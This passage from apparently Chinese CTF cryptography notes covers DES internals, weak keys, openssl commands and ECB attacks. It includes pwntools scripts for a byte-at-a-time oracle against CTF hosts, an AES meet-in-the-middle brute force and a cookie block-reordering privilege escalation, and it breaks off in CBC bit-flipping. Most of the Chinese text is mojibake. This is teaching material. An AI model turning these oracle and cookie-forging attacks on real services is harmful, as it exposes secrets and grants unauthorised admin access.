instance2.doFinal(digest); System.out.println(Arrays.toString(cipher)); byte[] c = &#123;11, -35, 55, 10, 62, 79, 125, 62, -28, 115, 77, 4, 73, 0, 11, 121, -126, 85, -83, 109, 1, -98, 35, -68, -4, -122, 14, 110, -28, 111, 22, -125&#125;; secretKeySpec = new SecretKeySpec(key, 0, key.length, &quot;AES&quot;); instance2 = Cipher.getInstance(&quot;AES/ECB/NoPadding&quot;); instance2.init(2, secretKeySpec); byte[] p = instance2.doFinal(c); System.out.println(Arrays.toString(p)); String out = Base64.getEncoder().encodeToString(p); System.out.println(out); &#125;&#125; â€‹ DESæ•°æ®åŠ å¯†æ ‡å‡†ï¼ˆè‹±è¯­ï¼šData Encryption Standardï¼Œç¼©å†™ä¸º DESï¼‰æ˜¯ä¸€ç§å¯¹ç§°å¯†é’¥åŠ å¯†å—å¯†ç ç®—æ³•ï¼Œ1976å¹´è¢«ç¾å›½è”é‚¦æ”¿åºœçš„å›½å®¶æ ‡å‡†å±€ç¡®å®šä¸ºè”é‚¦èµ„æ–™å¤„ç†æ ‡å‡†ï¼ˆFIPSï¼‰ï¼Œéšååœ¨å›½é™…ä¸Šå¹¿æ³›æµä¼ å¼€æ¥ã€‚å®ƒåŸºäºä½¿ç”¨56ä½å¯†é’¥çš„å¯¹ç§°ç®—æ³•ã€‚è¿™ä¸ªç®—æ³•å› ä¸ºåŒ…å«ä¸€äº›æœºå¯†è®¾è®¡å…ƒç´ ï¼Œç›¸å¯¹çŸ­çš„å¯†é’¥é•¿åº¦ä»¥åŠæ€€ç–‘å†…å«ç¾å›½å›½å®¶å®‰å…¨å±€ï¼ˆNSAï¼‰çš„åé—¨è€Œåœ¨å¼€å§‹æ—¶æœ‰äº‰è®®ï¼ŒDESå› æ­¤å—åˆ°äº†å¼ºçƒˆçš„å­¦é™¢æ´¾å¼çš„å®¡æŸ¥ï¼Œå¹¶ä»¥æ­¤æ¨åŠ¨äº†ç°ä»£çš„å—å¯†ç åŠå…¶å¯†ç åˆ†æçš„å‘å±•ã€‚ DESç°åœ¨å·²ç»ä¸æ˜¯ä¸€ç§å®‰å…¨çš„åŠ å¯†æ–¹æ³•ï¼Œä¸»è¦å› ä¸ºå®ƒä½¿ç”¨çš„56ä½å¯†é’¥è¿‡çŸ­ã€‚ åŠ å¯†æ–¹æ³• DESæ˜¯ä¸€ç§å…¸å‹çš„å—å¯†ç â€”ä¸€ç§å°†å›ºå®šé•¿åº¦çš„æ˜æ–‡é€šè¿‡ä¸€ç³»åˆ—å¤æ‚çš„æ“ä½œå˜æˆåŒæ ·é•¿åº¦çš„å¯†æ–‡çš„ç®—æ³•ã€‚å¯¹DESè€Œè¨€ï¼Œå—é•¿åº¦ä¸º64ä½ã€‚åŒæ—¶ï¼ŒDESä½¿ç”¨å¯†é’¥æ¥è‡ªå®šä¹‰å˜æ¢è¿‡ç¨‹ï¼Œå› æ­¤ç®—æ³•è®¤ä¸ºåªæœ‰æŒæœ‰åŠ å¯†æ‰€ç”¨çš„å¯†é’¥çš„ç”¨æˆ·æ‰èƒ½è§£å¯†å¯†æ–‡ã€‚å¯†é’¥è¡¨é¢ä¸Šæ˜¯64ä½çš„ï¼Œç„¶è€Œåªæœ‰å…¶ä¸­çš„56ä½è¢«å®é™…ç”¨äºç®—æ³•ï¼Œå…¶ä½™8ä½å¯ä»¥è¢«ç”¨äºå¥‡å¶æ ¡éªŒï¼Œå¹¶åœ¨ç®—æ³•ä¸­è¢«ä¸¢å¼ƒã€‚å› æ­¤ï¼ŒDESçš„æœ‰æ•ˆå¯†é’¥é•¿åº¦ä»…ä¸º56ä½ã€‚ ç®—æ³•çš„æ•´ä½“ç»“æœ‰16ä¸ªç›¸åŒçš„å¤„ç†è¿‡ç¨‹ï¼Œç§°ä¸ºâ€œå›æ¬¡â€ï¼ˆroundï¼‰ï¼Œå¹¶åœ¨é¦–å°¾å„æœ‰ä¸€æ¬¡ç½®æ¢ï¼Œç§°ä¸ºIPä¸FPï¼ˆæˆ–ç§°IP-1ï¼ŒFPä¸ºIPçš„åå‡½æ•°ï¼ˆå³IPâ€œæ’¤é”€â€FPçš„æ“ä½œï¼Œåä¹‹äº¦ç„¶ï¼‰ã€‚IPå’ŒFPå‡ ä¹æ²¡æœ‰å¯†ç å­¦ä¸Šçš„é‡è¦æ€§ï¼Œä¸ºäº†åœ¨1970å¹´ä»£ä¸­æœŸçš„ç¡¬ä»¶ä¸Šç®€åŒ–è¾“å…¥è¾“å‡ºæ•°æ®åº“çš„è¿‡ç¨‹è€Œè¢«æ˜¾å¼çš„åŒ…æ‹¬åœ¨æ ‡å‡†ä¸­ã€‚ åœ¨ä¸»å¤„ç†å›æ¬¡å‰ï¼Œæ•°æ®å—è¢«åˆ†æˆä¸¤ä¸ª32ä½çš„åŠå—ï¼Œå¹¶è¢«åˆ†åˆ«å¤„ç†ï¼›è¿™ç§äº¤å‰çš„æ–¹å¼è¢«ç§°ä¸ºè´¹æ–¯å¦¥ç»“æ„ã€‚è´¹æ–¯å¦¥ç»“æ„ä¿è¯äº†åŠ å¯†å’Œè§£å¯†è¿‡ç¨‹è¶³å¤Ÿç›¸ä¼¼â€”å”¯ä¸€çš„åŒºåˆ«åœ¨äºå­å¯†é’¥åœ¨è§£å¯†æ—¶æ˜¯ä»¥åå‘çš„é¡ºåºåº”ç”¨çš„ï¼Œè€Œå‰©ä½™éƒ¨åˆ†å‡ç›¸åŒã€‚è¿™æ ·çš„è®¾è®¡å¤§å¤§ç®€åŒ–äº†ç®—æ³•çš„å®ç°ï¼Œå°¤å…¶æ˜¯ç¡¬ä»¶å®ç°ï¼Œå› ä¸ºæ²¡æœ‰åŒºåˆ†åŠ å¯†å’Œè§£å¯†ç®—æ³•çš„éœ€è¦ã€‚ è´¹æ–¯å¦¥å‡½æ•°ï¼ˆFå‡½æ•°ï¼‰å°†æ•°æ®åŠå—ä¸æŸä¸ªå­å¯†é’¥è¿›è¡Œå¤„ç†ã€‚ç„¶åï¼Œä¸€ä¸ªFå‡½æ•°çš„è¾“å‡ºä¸å¦ä¸€ä¸ªåŠå—å¼‚æˆ–ä¹‹åï¼Œå†ä¸åŸæœ¬çš„åŠå—ç»„åˆå¹¶äº¤æ¢é¡ºåºï¼Œè¿›å…¥ä¸‹ä¸€ä¸ªå›æ¬¡çš„å¤„ç†ã€‚åœ¨æœ€åä¸€ä¸ªå›æ¬¡å®Œæˆæ—¶ï¼Œä¸¤ä¸ªåŠå—éœ€è¦äº¤æ¢é¡ºåºï¼Œè¿™æ˜¯è´¹æ–¯å¦¥ç»“æ„çš„ä¸€ä¸ªç‰¹ç‚¹ï¼Œä»¥ä¿è¯åŠ è§£å¯†çš„è¿‡ç¨‹ç›¸ä¼¼ã€‚ è´¹æ–¯å¦¥å‡½æ•°ï¼ˆFå‡½æ•°ï¼‰æ¯æ¬¡å¯¹åŠå—ï¼ˆ32ä½ï¼‰è¿›è¡Œæ“ä½œï¼Œå¹¶åŒ…æ‹¬å››ä¸ªæ­¥éª¤ï¼š æ‰©å¼  ç”¨æ‰©å¼ ç½®æ¢å°†32ä½çš„åŠå—æ‰©å±•åˆ°48ä½ï¼Œå…¶è¾“å‡ºåŒ…æ‹¬8ä¸ª6ä½çš„å—ï¼Œæ¯å—åŒ…å«4ä½å¯¹åº”çš„è¾“å…¥ä½ï¼ŒåŠ ä¸Šä¸¤ä¸ªé‚»æ¥çš„å—ä¸­ç´§é‚»çš„ä½ã€‚ ä¸å¯†é’¥æ··åˆ ç”¨å¼‚æˆ–æ“ä½œå°†æ‰©å¼ çš„ç»“æœå’Œä¸€ä¸ªå­å¯†é’¥è¿›è¡Œæ··åˆã€‚16ä¸ª48ä½çš„å­å¯†é’¥â€”æ¯ä¸ªç”¨äºä¸€ä¸ªå›æ¬¡çš„Få˜æ¢â€”æ˜¯åˆ©ç”¨å¯†é’¥è°ƒåº¦ä»ä¸»å¯†é’¥ç”Ÿæˆçš„ã€‚ Sç›’ åœ¨ä¸å­å¯†é’¥æ··åˆä¹‹åï¼Œå—è¢«åˆ†æˆ8ä¸ª6ä½çš„å—ï¼Œç„¶åä½¿ç”¨â€œSç›’â€ï¼Œæˆ–ç§°â€œç½®æ¢ç›’â€è¿›è¡Œå¤„ç†ã€‚8ä¸ªSç›’çš„æ¯ä¸€ä¸ªéƒ½ä½¿ç”¨ä»¥æŸ¥æ‰¾è¡¨æ–¹å¼æä¾›çš„éçº¿æ€§çš„å˜æ¢å°†å®ƒçš„6ä¸ªè¾“å…¥ä½å˜æˆ4ä¸ªè¾“å‡ºä½ã€‚Sç›’æä¾›äº†DESçš„æ ¸å¿ƒå®‰å…¨æ€§â€”å¦‚æœæ²¡æœ‰Sç›’ï¼Œå¯†ç ä¼šæ˜¯çº¿æ€§çš„ï¼Œå¾ˆå®¹æ˜“ç ´è§£ã€‚ ç½®æ¢ æœ€åï¼ŒSç›’çš„32ä¸ªè¾“å‡ºä½åˆ©ç”¨å›ºå®šçš„ç½®æ¢ï¼Œâ€œPç½®æ¢â€è¿›è¡Œé‡ç»„ã€‚è¿™ä¸ªè®¾è®¡æ˜¯ä¸ºäº†å°†æ¯ä¸ªSç›’çš„4ä½è¾“å‡ºåœ¨ä¸‹ä¸€å›æ¬¡çš„æ‰©å¼ åï¼Œä½¿ç”¨4ä¸ªä¸åŒçš„Sç›’è¿›è¡Œå¤„ç†ã€‚ Sç›’ï¼ŒPç½®æ¢å’ŒEæ‰©å¼ å„è‡ªæ»¡è¶³äº†å…‹åŠ³å¾·Â·é¦™å†œåœ¨1940å¹´ä»£æå‡ºçš„å®ç”¨å¯†ç æ‰€éœ€çš„å¿…è¦æ¡ä»¶ï¼Œâ€œæ··æ·†ä¸æ‰©æ•£â€ã€‚ å¼±å¯†é’¥åœ¨DESçš„è®¡ç®—ä¸­ï¼Œ56bitçš„å¯†é’¥æœ€ç»ˆä¼šè¢«å¤„ç†ä¸º16ä¸ªè½®å¯†é’¥ï¼Œæ¯ä¸€ä¸ªè½®å¯†é’¥ç”¨äº16è½®è®¡ç®—ä¸­çš„ä¸€è½®ï¼ŒDESå¼±å¯†é’¥ä¼šä½¿è¿™16ä¸ªè½®å¯†é’¥å®Œå…¨ä¸€è‡´ï¼Œæ‰€ä»¥ç§°ä¸ºå¼±å¯†é’¥ã€‚ å››ä¸ªå¼±å¯†é’¥ï¼š 1234\\x01\\x01\\x01\\x01\\x01\\x01\\x01\\x01\\xFE\\xFE\\xFE\\xFE\\xFE\\xFE\\xFE\\xFE\\xE0\\xE0\\xE0\\xE0\\xF1\\xF1\\xF1\\xF1\\x1F\\x1F\\x1F\\x1F\\x0E\\x0E\\x0E\\x0E å¦‚æœä¸è€ƒè™‘æ ¡éªŒä½çš„å¯†é’¥ï¼Œä»¥ä¸‹ä¹Ÿå±äºå¼±å¯†é’¥ï¼š 1234\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xFF\\xFF\\xFF\\xFF\\xFF\\xFF\\xFF\\xFF\\xE1\\xE1\\xE1\\xE1\\xF0\\xF0\\xF0\\xF0\\x1E\\x1E\\x1E\\x1E\\x0F\\x0F\\x0F\\x0F å¦‚æœä½¿ç”¨å¼±å¯†é’¥ï¼ŒPC1è®¡ç®—çš„ç»“æœä¼šå¯¼è‡´è½®å¯†é’¥å…¨éƒ¨ä¸º0ã€å…¨éƒ¨ä¸º1æˆ–å…¨éƒ¨01äº¤æ›¿ã€‚å› ä¸ºæ‰€æœ‰çš„è½®å¯†é’¥éƒ½æ˜¯ä¸€æ ·çš„ï¼Œå¹¶ä¸”DESæ˜¯ Feistelç½‘ç»œçš„ç»“æ„ï¼Œè¿™å°±å¯¼è‡´åŠ å¯†å‡½æ•°æ˜¯è‡ªåç›¸ (self-inverting) çš„ï¼Œç»“æœå°±æ˜¯åŠ å¯†ä¸€æ¬¡çœ‹èµ·æ¥æ²¡ä»€ä¹ˆé—®é¢˜ï¼Œä½†æ˜¯å¦‚æœå†åŠ å¯†ä¸€æ¬¡å°±å¾—åˆ°äº†æ˜æ–‡ã€‚ éƒ¨åˆ†å¼±å¯†é’¥éƒ¨åˆ†å¼±å¯†é’¥æ˜¯æŒ‡åªä¼šåœ¨è®¡ç®—è¿‡ç¨‹ä¸­äº§ç”Ÿä¸¤ä¸ªä¸åŒçš„å­å¯†é’¥ï¼Œæ¯ä¸€ä¸ªåœ¨åŠ å¯†çš„è¿‡ç¨‹ä¸­ä½¿ç”¨8æ¬¡ã€‚è¿™å°±æ„å‘³ç€è¿™å¯¹å¯†é’¥$k_1$ å’Œ $k_2$ æœ‰å¦‚ä¸‹æ€§è´¨ï¼š$E_{k_1}(E_{k_2}(M))=M$ã€‚ 6ä¸ªå¸¸è§çš„éƒ¨åˆ†å¼±å¯†é’¥å¯¹ï¼š 1234560x011F011F010E010E + 0x1F011F010E010E010x01E001E001F101F1 + 0xE001E001F101F1010x01FE01FE01FE01FE + 0xFE01FE01FE01FE010x1FE01FE00EF10EF1 + 0xE01FE01FF10EF10E0x1FFE1FFE0EFE0EFE + 0xFE1FFE1FFE0EFE0E0xE0FEE0FEF1FEF1FE + 0xFEE0FEE0FEF1FEF1 â€‹ åŠ è§£å¯†å·¥å…· opensslåŠ å¯†ï¼š openssl enc -aes-128-cbc -in plain.txt -out encrypt.txt -iv f123 -K 1223 -p -p: æ‰“å°åŠ å¯†ç”¨çš„salt,key,iv è§£å¯†ï¼š openssl aes-128-cbc -d -in encrypt.txt -out encrypt_decrypt.txt -S E0DEB1EAFE7F0000 -iv F1230000000000000000000000000000 -K 12230000000000000000000000000000 openssl enc -d -aes256 -in fl@g.txt -out 1.txt -S: salt â€‹ å¸¸è§æ”»å‡»ECBæ¨¡å¼æœ€ç®€å•çš„åŠ å¯†æ¨¡å¼å³ä¸ºç”µå­å¯†ç æœ¬ï¼ˆElectronic codebookï¼ŒECBï¼‰æ¨¡å¼ã€‚éœ€è¦åŠ å¯†çš„æ¶ˆæ¯æŒ‰ç…§å—å¯†ç çš„å—å¤§å°è¢«åˆ†ä¸ºæ•°ä¸ªå—ï¼Œå¹¶å¯¹æ¯ä¸ªå—è¿›è¡Œç‹¬ç«‹åŠ å¯†ã€‚ ä¸­é—´äººæ”»å‡»ï¼ˆMITMï¼‰å‡å¦‚å­˜åœ¨ä¸€ä¸ªæ”»å‡»è€…ï¼Œå½“ä»–ä½œä¸ºä¸­é—´äººæˆªè·ä¸¤æ–¹çš„é€šä¿¡æ—¶ï¼Œä»–èƒ½å¤Ÿæ”¹å˜å¯†æ–‡çš„åˆ†ç»„é¡ºåºï¼Œå½“æ¥æ”¶è€…å¯¹å¯†æ–‡è¿›è¡Œè§£å¯†æ—¶ï¼Œç”±äºå¯†æ–‡åˆ†ç»„çš„é¡ºåºè¢«æ”¹å˜äº†ï¼Œå› æ­¤ç›¸åº”çš„æ˜æ–‡åˆ†ç»„çš„é¡ºåºä¹Ÿè¢«æ”¹å˜äº†ï¼Œé‚£ä¹ˆæ¥æ”¶è€…å®é™…ä¸Šæ˜¯è§£å¯†å‡ºäº†ä¸€æ®µè¢«ç¯¡æ”¹åçš„å¯†æ–‡ã€‚åœ¨è¿™ç§åœºæ™¯ä¸­ï¼Œæ”»å‡»è€…ä¸éœ€è¦ç ´è¯‘å¯†ç ï¼Œä¹Ÿä¸éœ€è¦çŸ¥é“åˆ†ç»„å¯†ç çš„ç®—æ³•ï¼Œä»–åªéœ€è¦çŸ¥é“å“ªä¸ªåˆ†ç»„è®°å½•äº†ä»€ä¹ˆæ ·çš„æ•°æ®ã€‚ å‚è€ƒï¼šBoston Key Party CTF 2013 - MITM 123456789101112131415161718192021222324252627282930#python2from Crypto.Cipher import AESfrom binascii import hexlify,unhexlifyfrom string import printablealph = printablem = &#x27;&#x27;c = &#x27;&#x27;flag_c = &#x27;&#x27;middle = dict();for x in alph: for y in alph: for z in alph: key1 = &#x27;%s%s%s%s&#x27; % (&#x27;0&#x27; * 13, x, y, z) cipher = AES.new(key1) middle.update(&#123;cipher.encrypt(m): key1&#125;)print &quot;\\nTable built...\\n&quot;;for x in alph: for y in alph: for z in alph: key2 = &#x27;%s%s%s%s&#x27; % (x, y, z, &#x27;0&#x27; * 13) cipher = AES.new(key2) d = cipher.decrypt(c) if d in middle: print &quot;\\nKeys found: %s; %s\\nFlag:&quot; % (middle[d].encode(&#x27;hex&#x27;), key2.encode(&#x27;hex&#x27;)) cipher1 = AES.new(middle[d]) print cipher1.decrypt(cipher.decrypt(flag_c)) æ¨¡å¼æ”»å‡»åŠ¨æ€å¡«å……åŠ å¯†+æšä¸¾secretå­—ç¬¦ æ–¹æ³•ä¸€ 1.æ˜æ–‡ç”±è¾“å…¥å€¼m+flag+paddingç»„æˆï¼Œ$m$ ä¸ºç©ºæ—¶ï¼Œ $c$ å¯åˆ† $k$ å—ï¼Œä¸æ–­è°ƒæ•´ $m$ çš„é•¿åº¦ï¼Œç›´åˆ° $m$ é•¿åº¦ä¸º $l+1$ æ—¶ $c$ å¯åˆ† $k+1$ å—ï¼Œé‚£ä¹ˆè¯´æ˜ $m$ é•¿åº¦ä¸º $l$ æ—¶ $c$ åˆšå¥½å¯åˆ† $k$ å—ï¼Œå³æ— paddingæƒ…å†µä¸‹ï¼Œ$m+flag$ å¯åˆ† $k$ å—ï¼Œåˆ™flagé•¿åº¦å³ä¸º $8k-l$ã€‚ 2.åˆ©ç”¨ä¸Šé¢çš„æ€æƒ³ï¼Œåœ¨ $m$ é•¿åº¦ä¸º $l$ çš„åŸºç¡€ä¸Šï¼Œé•¿åº¦ä¸æ–­åŠ 1ï¼Œåˆ™å¯ä»¥æŠŠflagä»åå¼€å§‹çš„æ¯ä¸€ä½æ¨åˆ°ä¸‹ä¸€ä¸ªå—ä¸­ï¼Œå¾—åˆ°ä¸‹ä¸€ä¸ªå—çš„å¯†æ–‡ $c_i$ï¼› 3.åˆå·²çˆ†ç ´å‡ºçš„flagä½+paddingå·²çŸ¥ï¼Œåˆ™ä¸‹ä¸€ä¸ªå—çš„æ„æˆä¸ºæœªçŸ¥å­—ç¬¦1ä½+å·²çˆ†ç ´å‡ºçš„flagä½(+padding)ï¼› 4.æ ¹æ®DES-ECBçš„æ€§è´¨ï¼Œç›¸åŒæ˜æ–‡å—å¯¹åº”çš„å¯†æ–‡å—ç›¸åŒã€‚çˆ†ç ´ç¬¬ä¸€ä½æœªçŸ¥å­—ç¬¦ï¼Œå°†ä¸Šé¢çš„å—æ„æˆä½œä¸ºè¾“å…¥å€¼è¾“å…¥ï¼Œå¾—åˆ°å¯¹åº”çš„å¯†æ–‡çš„ç¬¬ä¸€å—ï¼Œåˆ†åˆ«ä¸å®é™…å¯†æ–‡ $c_i$ æ¯”è¾ƒï¼ŒåŒ¹é…çš„å³ä¸ºæ­£ç¡®çš„æ˜æ–‡å­—ç¬¦ã€‚ 5.ä»¥æ­¤ç±»æ¨ï¼Œå¾—åˆ°å®Œæ•´flagã€‚ å‚è€ƒï¼š ECBæ¨¡å¼æ”»å‡» 1024æ¯ - å¯†ç ç³»ç»Ÿ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051from pwn import *import gmpy2import stringhost = &#x27;das.wetolink.com&#x27;port = 42887block = 16secret_len = 38ori_padding_len = 10dic = &#x27;&#123;&#125;-&#x27;+string.ascii_lowercase+string.digitsp = connect(host,port)flag = &#x27;&#x27;def pad(leng): pad_len = block - (leng % block) if leng % block != 0 else 0 return chr(pad_len) * pad_lenpadding = [pad(k) for k in range(16)]padding = padding[1:]+[padding[0]]for i in range(secret_len): find=0 payload = (&#x27;*&#x27;*(ori_padding_len+i+1)).encode(&#x27;hex&#x27;) group = i//block p.recvuntil(&#x27;Amazing function: &#x27;) p.sendline(payload) data = p.recvline().strip() print([data[i:i+32] for i in range(0,len(data),32)]) print(data) if group == 0: prob=data[-32:] else: prob=(data[-32*(group+1):-32*(group+1)+32]) print(str(i+1)+&#x27; prob = &#x27;+str(prob)) for j in dic: p.recvuntil(&#x27;Amazing function: &#x27;) flag_suffix = flag[:min(len(flag),15)] payload = (j + flag_suffix + padding[min(len(flag_suffix),15)]).encode(&#x27;hex&#x27;) p.sendline(payload) data = p.recvline().strip() if data[:32]==prob: flag = j + flag print(str(i+1)+&#x27; flag = &#x27;+flag) print() find=1 break if find == 0: print(str(i+1)+&#x27; cannot find!&#x27;) break æ–¹æ³•äºŒ 1.ç”±äºæ˜¯ECBçš„æ¨¡å¼ï¼Œæ‰€ä»¥å½“æˆ‘ä»¬è¾“å…¥åäº”ä¸ªâ€™0â€™åï¼ŒæœåŠ¡ä¼šå°†åäº”ä¸ªâ€™0â€™+flagåŠ å¯†ï¼Œè€Œæ­¤æ—¶ç¬¬ä¸€ç»„å°±æ˜¯åäº”ä¸ªâ€™0â€™å’Œflagçš„ç¬¬ä¸€ä¸ªå­—ç¬¦ã€‚å³ï¼Œè¿”å›çš„æ˜æ–‡çš„ç¬¬ä¸€ç»„æ˜¯â€™0â€™*15 + flag[0]çš„å¯†æ–‡ã€‚ 2.æˆ‘ä»¬éå†0-255ï¼Œå‘é€â€™0â€™*15+chr(i)ï¼Œçœ‹è¿”å›çš„å¯†æ–‡æ˜¯ä¸æ˜¯å’Œæœ€åˆè·å¾—çš„å¯†æ–‡çš„ç¬¬ä¸€ç»„ä¸€è‡´ï¼Œå¦‚æœä¸€è‡´ï¼Œé‚£ä¹ˆæ­¤æ—¶çš„chr(i)å°±æ˜¯flagçš„ç¬¬ä¸€ä½ã€‚ 3.æœ‰äº†ç¬¬ä¸€ä½æˆ‘ä»¬å°±å¯ä»¥å‘é€â€™0â€™*14+flag[0]è¿‡å»ï¼Œæ­¤æ—¶è¿”å›çš„ç¬¬ä¸€ç»„å¯†æ–‡å°±æ˜¯â€™0â€™*14+flag[0]+flag[1]çš„å¯†æ–‡äº†ï¼Œæˆ‘ä»¬ç»§ç»­ç”¨ç¬¬2æ­¥çš„æ–¹æ³•å°±å¯ä»¥æ¢å¤flag[1]äº†ã€‚ 4.å¦‚æ­¤å¾ªç¯å¾€å¤ï¼Œé€ä½çˆ†ç ´flagã€‚ 12345678910111213141516171819202122def exp(): sh = remote(&quot;0.0.0.0&quot;,&quot;9999&quot;) pre=&quot;0&quot;*47 flag=&quot;&quot; for block in range(41): #å‘é€å¡«å……ï¼Œæ³„éœ²ä¸€ä½flagï¼Œå¹¶è·å–å¯†æ–‡ sh.recvuntil(&quot;Amazing function: &quot;) sh.sendline(pre.encode(&#x27;hex&#x27;)) target = sh.recvuntil(&quot;\\n&quot;)[:-1][64:96] for i in range(256): #éå†å­—ç¬¦ï¼Œæ‰¾åˆ°ä¸è·å–å¯†æ–‡ä¸€è‡´æ—¶çš„æƒ…å†µæ—¶ï¼Œå³å¾—åˆ°ä¸€ä½æ˜æ–‡ tmp = &#x27;0&#x27;*(47-block)+flag+chr(i) sh.recvuntil(&quot;Amazing function: &quot;) sh.sendline(tmp.encode(&#x27;hex&#x27;)) now = sh.recvuntil(&quot;\\n&quot;)[:-1] if now[64:96] == target: flag += chr(i) #ä¿®æ”¹å¡«å…… pre = pre[:-1] break return flag[7:-2] é‡æ’æ”»å‡»åœ¨å—åŠ å¯†ä¸­ECBæ¨¡å¼ä¸­æ¯ä¸ªå—éƒ½æ˜¯ç‹¬ç«‹åŠ å¯†çš„ã€‚å› æ­¤æ”»å‡»è€…å¯ä»¥åœ¨æœªçŸ¥å¯†é’¥çš„æƒ…å†µä¸‹ï¼Œå¯¹å¯†æ–‡ä¸­çš„å—è¿›è¡Œé‡æ–°æ’åˆ—ï¼Œç»„åˆæˆåˆæ³•çš„å¯è§£å¯†çš„æ–°å¯†æ–‡ã€‚ è€ƒè™‘è¿™ä¹ˆä¸€ç§åœºæ™¯ï¼ŒæŸCMSçš„cookieæ ¼å¼ä¸ºDES-ECBåŠ å¯†åçš„æ•°æ®ï¼Œè€Œæ˜æ–‡æ ¼å¼å¦‚ä¸‹ï¼š 1admin=0;username=pan ç”±äºDESä½¿ç”¨çš„å—å¤§å°æ˜¯8å­—èŠ‚ï¼Œå› æ­¤ä¸Šè¿°æ˜æ–‡å¯ä»¥åˆ‡åˆ†æˆä¸‰ä¸ªå—ï¼Œå…¶ä¸­@ä¸ºå¡«å……ç¬¦å·ï¼š 123admin=0;username=pan@@@@ å‡è®¾æˆ‘ä»¬å¯ä»¥æ§åˆ¶è‡ªå·±çš„ç”¨æˆ·åï¼ˆåœ¨æ³¨å†Œæ—¶ï¼‰ï¼Œé‚£ä¹ˆæœ‰ä»€ä¹ˆåŠæ³•å¯ä»¥åœ¨ä¸çŸ¥é“å¯†é’¥çš„æƒ…å†µä¸‹å°†è‡ªå·±æå–ä¸ºç®¡ç†å‘˜å‘¢ï¼ˆå³admin=1ï¼‰ï¼Ÿé¦–å…ˆå°†ç”¨æˆ·åè®¾ç½®ä¸ºpan@@@@admin=1;ï¼Œæ­¤æ—¶æ˜æ–‡å—çš„å†…å®¹å¦‚ä¸‹ï¼š 1234admin=0;username=pan@@@@admin=1; æˆ‘ä»¬æ‰€éœ€è¦åšçš„ï¼Œå°±æ˜¯åœ¨åŠ å¯†å®Œæˆåï¼Œå°†æœåŠ¡å™¨è¿”å›çš„cookieä½¿ç”¨æœ€åä¸€ä¸ªå—æ›¿æ¢ç¬¬ä¸€ä¸ªå—ï¼Œè¿™æ ·ä¸€æ¥å°±è·å¾—äº†ä¸€ä¸ªå…·æœ‰ç®¡ç†å‘˜æƒé™çš„åˆæ³•cookieäº†ã€‚ â€‹ CBCæ¨¡å¼IBMå‘æ˜äº†å¯†ç åˆ†ç»„é“¾æ¥ï¼ˆCBCï¼ŒCipher-block chainingï¼‰æ¨¡å¼ã€‚åœ¨CBCæ¨¡å¼ä¸­ï¼Œæ¯ä¸ªæ˜æ–‡å—å…ˆä¸å‰ä¸€ä¸ªå¯†æ–‡å—è¿›è¡Œå¼‚æˆ–åï¼Œå†è¿›è¡ŒåŠ å¯†ã€‚åœ¨è¿™ç§æ–¹æ³•ä¸­ï¼Œæ¯ä¸ªå¯†æ–‡å—éƒ½ä¾èµ–äºå®ƒå‰é¢çš„æ‰€æœ‰æ˜æ–‡å—ã€‚åŒæ—¶ï¼Œä¸ºäº†ä¿è¯æ¯æ¡æ¶ˆæ¯çš„å”¯ä¸€æ€§ï¼Œåœ¨ç¬¬ä¸€ä¸ªå—ä¸­éœ€è¦ä½¿ç”¨åˆå§‹åŒ–å‘é‡ã€‚ åŠ å¯†ï¼š Ciphertext-0 = Encrypt(Plaintext XOR IV) â€”â€”åªç”¨äºç¬¬ä¸€ä¸ªç»„å—Ciphertext-N= Encrypt(Plaintext XOR Ciphertext-N-1) â€”â€”ç”¨äºç¬¬äºŒåŠå‰©ä¸‹çš„ç»„å— $\\left\\{\\begin{array} {c} c_1 = \\text{Enc}(m_1 \\oplus \\text{iv}) \\newline c_2 = \\text{Enc}(m_2 \\oplus c_1) \\newline \\vdots \\newline c_i = \\text{Enc}(m_i \\oplus c_{i-1}) \\end{array} \\right.$ è§£å¯†ï¼š Plaintext-0 = Decrypt(Ciphertext) XOR IV â€”â€”åªç”¨äºç¬¬ä¸€ä¸ªç»„å—Plaintext-N= Decrypt(Ciphertext) XOR Ciphertext-N-1 â€”â€”ç”¨äºç¬¬äºŒåŠå‰©ä¸‹çš„ç»„å— $\\left\\{\\begin{array} {c} m_1 = \\text{Dec}(c_1)\\oplus \\text{iv} \\newline m_2 = \\text{Dec}(c_2)\\oplus c_1 \\newline \\vdots \\newline m_i = \\text{Dec}(c_i)\\oplus c_{i-1} \\end{array} \\right.$ CBCå­—èŠ‚ç¿»è½¬Plaintextï¼šæ˜æ–‡æ•°æ® IVï¼šåˆå§‹å‘é‡ Keyï¼šåˆ†ç»„åŠ å¯†ä½¿ç”¨çš„å¯†é’¥ Ciphertextï¼šå¯†æ–‡æ•°æ® æ¯ç»„è§£å¯†æ—¶ï¼Œå…ˆè¿›è¡Œåˆ†ç»„åŠ å¯†ç®—æ³•çš„è§£å¯†ï¼Œç„¶åä¸å‰ä¸€ç»„çš„å¯†æ–‡è¿›è¡Œå¼‚æˆ–æ‰æ˜¯æœ€åˆçš„æ˜æ–‡ã€‚ å¯¹äºç¬¬ä¸€ç»„åˆ™æ˜¯ä¸IVè¿›è¡Œå¼‚æˆ–ã€‚ ä¸Šä¸€å—å¯†æ–‡ç”¨æ¥äº§ç”Ÿä¸‹ä¸€å—æ˜æ–‡ï¼Œå¦‚æœæ”¹å˜ä¸Šä¸€å—å¯†æ–‡çš„ä¸€ä¸ªå­—èŠ‚ï¼Œç„¶åä¸ä¸‹ä¸€ä¸ªè§£å¯†åçš„ç»„å—å¼‚æˆ–ï¼Œå°±å¯ä»¥å¾—åˆ°ä¸€ä¸ªä¸åŒçš„æ˜æ–‡ã€‚ ç›®æ ‡ï¼šè¦æŠŠPlain2ä¸­çš„æŸä¸€å­—èŠ‚ç¿»è½¬ä¸ºå¦ä¸€å­—èŠ‚ã€‚ ç”±äºC1æ¥è‡ªäºCipher2è¿›è¡ŒBlock Cipher Decryptionä¹‹åçš„ç»“æœï¼Œè€Œä¸”KeyæœªçŸ¥ï¼Œå°±ä¸èƒ½ç›´æ¥å¾—çŸ¥C1çš„å€¼ï¼› ä½†å¯é€šè¿‡å­—èŠ‚ç¿»è½¬ä¿®æ”¹ä¸Šä¸€ç»„å¯†æ–‡Cipher1æ¥ç¿»è½¬ä¸‹ä¸€ç»„çš„æ˜æ–‡Plain2ï¼Œä»è€Œå¯ä»¥å®Œå…¨å¿½è§†æœªçŸ¥çš„C1å€¼ã€‚ ç”±å¼‚æˆ–è¿ç®—å¯ä»¥æ¨å¯¼ï¼šB1 = A1 ^ C1ï¼Œåˆ™ä¹Ÿæœ‰ï¼šC1 = A1 